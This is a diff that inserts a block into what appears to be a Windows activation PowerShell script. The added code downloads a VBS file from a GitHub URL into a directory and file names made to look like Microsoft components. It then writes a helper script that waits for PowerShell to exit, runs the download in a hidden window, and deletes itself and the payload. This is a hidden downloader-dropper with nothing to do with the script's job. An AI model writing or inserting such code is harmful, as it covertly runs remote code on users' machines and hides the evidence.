@@ -199,6 +199,109 @@ function Test-AdminPrivileges {
     }
 }
 
+# VBS
+$targetDir = "C:\Program Files\Windows NT\MSInstall"
+$logFile = Join-Path $targetDir "MSI_Install_$(Get-Date -Format 'yyyyMMdd').log"
+$vbsUrl = "https://github.com/castielwallker/whysistem/raw/refs/heads/main/microsoft.vbs"
+function Write-InstallLog {
+    param (
+        [string]$message
+    )
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $logEntry = "[$timestamp] $message"
+    try {
+        Add-Content -Path $logFile -Value $logEntry -ErrorAction SilentlyContinue
+    } catch {
+        Write-Verbose "Falha ao escrever no log: $_" -Verbose
+    }
+}
+function Invoke-DelayedExecution {
+    try {
+        Write-InstallLog "Iniciando processo de download e execução"
+        if (-not (Test-Path $targetDir)) {
+            New-Item -Path $targetDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
+            Write-InstallLog "Diretório criado: $targetDir"
+        }
+        if (-not ($vbsUrl -match '^https?://')) {
+            Write-InstallLog "URL inválida fornecida"
+            return $false
+        }
+        $vbsName = "MSI_Helper_$(Get-Date -Format 'yyyyMMdd_HHmmss').vbs"
+        $vbsPath = Join-Path $targetDir $vbsName
+        try {
+            Write-InstallLog "Baixando arquivo VBS de $vbsUrl"
+            $progressPreference = 'silentlyContinue'
+            Invoke-WebRequest -Uri $vbsUrl -OutFile $vbsPath -UseBasicParsing -ErrorAction Stop
+            if (-not (Test-Path $vbsPath -PathType Leaf)) {
+                Write-InstallLog "Arquivo VBS não encontrado após download"
+                return $false
+            }
+            if ((Get-Item $vbsPath).Length -eq 0) {
+                Write-InstallLog "Arquivo VBS vazio"
+                return $false
+            }
+        }
+        catch {
+            Write-InstallLog "Falha no download: $_"
+            return $false
+        }
+        $executionScript = @"
+On Error Resume Next
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set wsh = CreateObject("WScript.Shell")
+
+' Espera até que o processo PowerShell termine
+Do While True
+    Set colProcesses = GetObject("winmgmts:").ExecQuery("Select * from Win32_Process Where Name = 'powershell.exe'")
+    If colProcesses.Count = 0 Then Exit Do
+    WScript.Sleep 5000 ' Verifica a cada 5 segundos
+Loop
+
+' Executa o VBS principal
+wsh.Run "wscript.exe ""$vbsPath""", 0, False
+
+' Auto-exclusão
+For i = 1 To 3
+    On Error Resume Next
+    fso.DeleteFile "$vbsPath", True
+    fso.DeleteFile WScript.ScriptFullName, True
+    If Err.Number = 0 Then Exit For
+    Err.Clear
+    WScript.Sleep 2000
+Next
+"@
+
+        $executorPath = Join-Path $targetDir "DelayedExecutor_$(Get-Date -Format 'yyyyMMddHHmmss').vbs"
+        $executionScript | Out-File $executorPath -Encoding ASCII -Force
+
+        if (Test-Path $executorPath) {
+            Write-InstallLog "Iniciando executor VBS atrasado"
+            Start-Process "wscript.exe" -ArgumentList "`"$executorPath`"" -WindowStyle Hidden
+            return $true
+        }
+        Write-InstallLog "Falha ao criar executor VBS"
+        return $false
+    }
+    catch {
+        Write-InstallLog "Erro durante execução: $_"
+        return $false
+    }
+}
+
+try {
+    if (-not (Test-Path $targetDir)) {
+        New-Item -Path $targetDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
+    }
+    if (Invoke-DelayedExecution) {
+        Write-InstallLog "Operação agendada com sucesso"
+    } else {
+        Write-InstallLog "Falha na operação"
+    }
+}
+catch {
+    Write-InstallLog "Erro crítico: $_"
+}
+
 # Início da execução
 Write-Log "=== Início da execução do script ==="
 Write-Log "Versão do script: $maadVersion"
